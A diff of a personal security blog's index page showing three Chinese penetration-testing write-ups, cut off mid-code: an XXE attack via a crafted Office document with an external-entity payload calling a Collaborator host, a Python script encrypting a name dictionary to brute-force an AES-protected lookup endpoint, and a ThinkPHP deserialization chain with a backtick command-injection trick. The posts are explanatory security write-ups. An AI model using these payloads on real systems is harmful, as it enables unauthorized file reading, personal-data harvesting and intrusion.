@@ -1,268 +1,680 @@
-
 <!DOCTYPE html>
-<html lang="en" class="loading">
+<html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>singsing&#39;s Blog</title>
-    <meta name="apple-mobile-web-app-capable" content="yes" />
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="google" content="notranslate" />
-    <meta name="keywords" content="singsing,"> 
-    
-    <meta name="author" content="singsing"> 
-    <link rel="alternative" href="atom.xml" title="singsing&#39;s Blog" type="application/atom+xml"> 
-    <link rel="icon" href="/img/favicon.png"> 
-    
-    
-    
-    <meta name="twitter:card" content="summary"/>
-    <meta name="twitter:title" content="singsing&#39;s Blog"/>
-    
-    
-    
-    
-    
-    <meta property="og:site_name" content="singsing&#39;s Blog"/>
-    <meta property="og:type" content="object"/>
-    <meta property="og:title" content="singsing&#39;s Blog"/>
-    
-    
-<link rel="stylesheet" href="/css/diaspora.css">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<meta name="generator" content="Hexo 6.1.0"></head>
+<link rel="stylesheet" href="/css/main.css">
 
-<body class="loading">
-    <span id="config-title" style="display:none">singsing&#39;s Blog</span>
-    <div id="loader"></div>
-    <div class="nav">
-    <ul id="menu-menu" class="menu">
-        
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="//" title="首页" target="_blank" rel="noopener">首页</a>
-        </li>
-        
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="/categories/" title="分类" target="_blank" rel="noopener">分类</a>
-        </li>
-        
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="/tags/" title="标签" target="_blank" rel="noopener">标签</a>
-        </li>
-        
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="/archives/" title="归档" target="_blank" rel="noopener">归档</a>
-        </li>
-        
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="/search/" title="搜索" target="_blank" rel="noopener">搜索</a>
-        </li>
-        
-        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
-            <a href="/about/" title="关于" target="_blank" rel="noopener">关于</a>
-        </li>
-        
-    </ul>
-	<span class="target"></span>
-	<center>
-	<div class="hitokoto">
-		<span class="typed" id="hitokoto" data-st="true"></span>
-	</div>
-	</center>
-	
-	<p class="footerlinks">
-		<a href="#" class="iconfont icon-null"></a>
-		
-            <a href="/" title="facebook" class="iconfont icon-facebook" target="_blank" rel="noopener"> </a>
-        
-            <a href="/" title="twitter" class="iconfont icon-twitter" target="_blank" rel="noopener"> </a>
-        
-            <a href="/" title="github" class="iconfont icon-github" target="_blank" rel="noopener"> </a>
-        
-            <a href="/img/logo.png" title="wechat" class="iconfont icon-wechat" target="_blank" rel="noopener"> </a>
-        
-            <a href="mailto:xxxx@gmail.com" title="email" class="iconfont icon-email" target="_blank" rel="noopener"> </a>
-        
-		<a href="#" class="iconfont icon-null"></a>
-	</p>
-	
-    <p id="copyright">
-        &copy; 2022 singsing.
-        <span> | </span>Powered by <a href="https://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
-        <span> | </span>Theme <a href="https://github.com/Fechin/hexo-theme-diaspora" title="Diaspora" target="_blank" rel="noopener">Diaspora</a> by Fechin
-		
-		<span> | </span><a rel="nofollow" href="http://www.beian.miit.gov.cn" target="_blank">冀ICP备xxxxxxx号</a>
-		
-    </p>
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="website">
+<meta property="og:title" content="singsing&#39;s Blog">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="singsing&#39;s Blog">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="singsing">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'en'
+  };
+</script>
+
+  <title>singsing's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">singsing's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
 </div>
 
-<div id="container">
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-首页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
     
-<div id="screen">
-    <div id="mark">
-        <div class="layer" data-depth="0.4">
-            <img src="/img/welcome-cover.jpg" id="cover" crossorigin="anonymous" width="1920" height="1080">
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="singsing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="singsing's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">通过 Office Open XML 解析器进行XXE攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-03-18 20:48:27 / Modified: 22:12:31" itemprop="dateCreated datePublished" datetime="2022-03-18T20:48:27+08:00">2022-03-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
         </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><h3 id="XXE-via-Office-Open-XML-Parsers"><a href="#XXE-via-Office-Open-XML-Parsers" class="headerlink" title="XXE via Office Open XML Parsers"></a>XXE via Office Open XML Parsers</h3><p>（复制自 <a target="_blank" rel="noopener" href="https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/"><strong>here</strong></a>）<br>许多 Web 应用程序允许您上传 Microsoft Office 文档，然后后端会从中解析数据。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要<strong>parse at least one XML file</strong>.</p>
+<p>对此进行测试的唯一方法是生成一个包含 XXE 有效负载的 <strong>Microsoft Office 文件</strong>，所以让我们这样做。<br>首先，创建一个空目录来解压你的文档，然后解压！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">test$ ls</span><br><span class="line">test.docx</span><br><span class="line">test$ mkdir unzipped</span><br><span class="line">test$ unzip ./test.docx -d ./unzipped/</span><br><span class="line">Archive:  ./test.docx</span><br><span class="line">  inflating: ./unzipped/word/numbering.xml</span><br><span class="line">  inflating: ./unzipped/word/settings.xml</span><br><span class="line">  inflating: ./unzipped/word/fontTable.xml</span><br><span class="line">  inflating: ./unzipped/word/styles.xml</span><br><span class="line">  inflating: ./unzipped/word/document.xml</span><br><span class="line">  inflating: ./unzipped/word/_rels/document.xml.rels</span><br><span class="line">  inflating: ./unzipped/_rels/.rels</span><br><span class="line">  inflating: ./unzipped/word/theme/theme1.xml</span><br><span class="line">  inflating: ./unzipped/[Content_Types].xml</span><br></pre></td></tr></table></figure>
+
+<p>在您喜欢的文本编辑器 (vim) 中打开 <code>./unzipped/word/document.xml</code> 并编辑 <strong>XML 以包含您喜欢的 XXE 有效负载</strong>。我尝试的第一件事往往是 HTTP 请求，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY test SYSTEM &quot;http://[ID].burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这些行应该像这样插入到两个根 XML 对象之间，当然您需要将 URL 替换为可以监视请求的 URL：</p>
+<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png" alt="Those lines should be inserted in between the two root XML objects, like thi"></p>
+<p>剩下的就是<strong>压缩文件以创建恶意的 poc.docx 文件</strong>。从我们之前创建的“解压缩”目录中，运行以下命令：</p>
+<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png" alt="From the &quot;unzipped&quot; directory that we created earlier, run the following:"></p>
+<p>现在将文件上传到易受攻击的 Web 应用程序，并在 Burp Collaborator 日志监控是否收到请求。</p>
+<h2 id="0x02-通过上传Excel对网站进行XXE攻击"><a href="#0x02-通过上传Excel对网站进行XXE攻击" class="headerlink" title="0x02-通过上传Excel对网站进行XXE攻击"></a>0x02-通过上传Excel对网站进行XXE攻击</h2><h3 id="0x02-1-确认XXE"><a href="#0x02-1-确认XXE" class="headerlink" title="0x02-1 确认XXE"></a>0x02-1 确认XXE</h3><p>某次对项目网站进行测试，发现应用系统中提供多个上传接口，允许用户上传 Excel 文件并在后端对 Excel 文件进行数据解析导入。<br>根据 <code>0x01-前言</code> 提及的方法，对 Excel 解压，修改文件XML内容。第一次修改的文件为 <code>[Content_Types].xml</code> ，修改后重压缩文件为 xsls 文件并上传，测试后现XXE攻击失败。<br>后续将 <code>xl/workbook.xml</code>、<code>xl/worksheets/sheet1.xml</code>、<code>xl/theme/theme1.xml</code>的内容均作修改，插入 XXE PayLoad。重新上传修改后的 xsls 文件，成功触发 XXE漏洞。</p>
+<h3 id="0x02-2-读取文件"><a href="#0x02-2-读取文件" class="headerlink" title="0x02-2 读取文件"></a>0x02-2 读取文件</h3><p>还没来得及测试，对方已修复漏洞，bingo！！！</p>
+
+      
     </div>
-    <div id="vibrant">
-        <svg viewbox="0 0 2880 1620" height="100%" preserveaspectratio="xMaxYMax slice">
-            <polygon opacity="0.7" points="2000,1620 0,1620 0,0 600,0 "/>
-        </svg>
-        <div></div>
-    </div>
-    <div id="header">
-        <div>
-            <a class="image-logo" href="/"></a>
-			
-			<div class="iconfont icon-search switchsearch" href="/search/" title="搜索"></div>
-			
-            <div class="iconfont icon-menu switchmenu"></div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%89%8D%E7%AB%AFAES%E5%8A%A0%E5%AF%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="singsing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="singsing's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%89%8D%E7%AB%AFAES%E5%8A%A0%E5%AF%86/" class="post-title-link" itemprop="url">暴力破解之前端AES加密</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-03-18 11:50:23 / Modified: 22:15:46" itemprop="dateCreated datePublished" datetime="2022-03-18T11:50:23+08:00">2022-03-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
         </div>
-    </div>
+      </header>
+
     
-    <div id="post0">
-        <p>三月 18, 2022</p>
-        <h2><a href="/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/" title="通过 Office Open XML 解析器进行XXE攻击" class="posttitle">通过 Office Open XML 解析器进行XXE攻击</a></h2>
-        <p class="summary">0x01-前言XXE via Office Open XML Parsers（复制自 here）许多 Web 应用...</p>
-    </div>
     
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>某次测试中遇到一个信息泄露漏洞。页面提供一个查询功能，用户需要填写两个或三个参数值，且参数值正确才能返回相关信息。在测试中，发现仅需提供一个参数值即可以返回相关信息。如在提供<em><strong>姓名输入框</strong></em>中填入：“吴翠”，即可返回“吴翠”的相关信息。</p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318120459.png"></p>
+<h2 id="0x02-AES加密的参数"><a href="#0x02-AES加密的参数" class="headerlink" title="0x02-AES加密的参数"></a>0x02-AES加密的参数</h2><p>测试过程中，发现参数值经过加密，翻查JS文件，确认是AES加密。<br>一开始的想法是使用 Burpsuite 的 <code>JS Rainbow</code> 插件加载JS文件，自动执行加密函数加密参数值进行爆破，后发现导入字典测试的时候，由于字典内容为中文，会导致加密结果与预期不一致，后端无法解析加密后的数据，导致查询失败。<br>后续尝试使用 <code>BurpCrypto</code>、<code>AES KILLER</code>等 Burpsuite 插件时均与上面情况一样，中文内容加密与预期不一致。估计是由于 Burpsuite 软件自身问题。<br>再后使用 python 写个小程序，将字典加密，将加密结果作为字典导入 Burpsuite 爆破才成功。</p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318122718.png"></p>
+<p><strong>加密小程序源代码</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">b&#x27;FC5E8DF8BB4A2F78&#x27;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27;!1@2#3$4%5^6&amp;7*8&#x27;</span></span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    padtext=pad(text,<span class="number">16</span>,style=<span class="string">&#x27;pkcs7&#x27;</span>)</span><br><span class="line">    cipherText=cryptos.encrypt(padtext)</span><br><span class="line">    <span class="keyword">return</span> base64.encodebytes(cipherText)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;500.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fs.readlines():</span><br><span class="line">            name = <span class="built_in">bytes</span>(line.strip(),encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">            e = encrypt(name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(e.strip(), encoding = <span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="singsing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="singsing's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/18/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/" class="post-title-link" itemprop="url">ThinkPHP反序列化漏洞&#x2d;1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-03-18 10:28:14 / Modified: 22:41:52" itemprop="dateCreated datePublished" datetime="2022-03-18T10:28:14+08:00">2022-03-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP/" itemprop="url" rel="index"><span itemprop="name">PHP</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><p>详见前文</p>
+<h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02-利用条件"></a>0x02-利用条件</h2><p>详见前文</p>
+<h2 id="0x03-知识要点"><a href="#0x03-知识要点" class="headerlink" title="0x03-知识要点"></a>0x03-知识要点</h2><p>官方文档介绍 ThinkPHP 6.* 启动方式是在终端输入 <code>php think run</code>，启动之后会在终端滚动显示应用运行的情况。通过测试，当通过 <code>system</code> 函数在终端下执行如下形式，<code>system([],&quot;`whoami`&quot;)</code>，可正式执行 <code>whoami</code> 函数，这是由于 shell 中的优先级高，所以会先执行 &#96;&#96; 中的内容，再把执行结果拼接成一个新命令，但是实际上system函数是报错的，所以实际环境不一定会显示出执行后的报错信息。</p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286640471.png"></p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286645101.png"></p>
+<h2 id="0x04-构造POP"><a href="#0x04-构造POP" class="headerlink" title="0x04-构造POP"></a>0x04-构造POP</h2><h3 id="搜索-destruct-方法"><a href="#搜索-destruct-方法" class="headerlink" title="搜索 __destruct 方法"></a>搜索 __destruct 方法</h3><p>全文搜索 <code>__destruct</code> ，发现 <code>/vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache.php</code> 存在该方法，尝试从该点出发挖掘反序列化漏洞。根据 <code>__destruct</code> 方法代码可知，当 <code>$this-&gt;autosave= false</code> 的时候，会进入 <code>$this-&gt;save()</code> 方法。</p>
+<h3 id="跟进-save-方法"><a href="#跟进-save-方法" class="headerlink" title="跟进 save() 方法"></a>跟进 save() 方法</h3><p>发现没有实现 <code>save()</code> 方法的代码，尝试查找继承了 AbstractCache 并且实现了 save 方法的继承类。找到如下：<code>/vendor/topthink/framework/src/think/filesystem/CacheStore.php</code> ，<code>save()</code> 方法实现如下：</p>
+<p><strong>save()：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$contents</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getForStorage</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进 <code>getForStorage()</code> ，发现 <code>cleanContents()</code> 方法，跟进 <code>cleanContents()</code> 方法，该代码大概意思就是从<code> $contents[$path]</code> 列表中提取键名与 <code>[&#39;path&#39;, &#39;dirname&#39;, ...]</code> 相同键值对，同时更新 <code>$contents[$path]</code> 的值。未发现可利用方法。<br>返回getForStorage()，接下来的代码是reture一个经过json_encode处理的数组。</p>
+<p><strong>getForStorage()：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$cleaned</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanContents</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([<span class="variable">$cleaned</span>, <span class="variable">$this</span>-&gt;complete]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>cleanContents()：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$cachedProperties</span> = <span class="title function_ invoke__">array_flip</span>([</span><br><span class="line"><span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$object</span>)) &#123;</span><br><span class="line"><span class="variable">$contents</span>[<span class="variable">$path</span>] = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 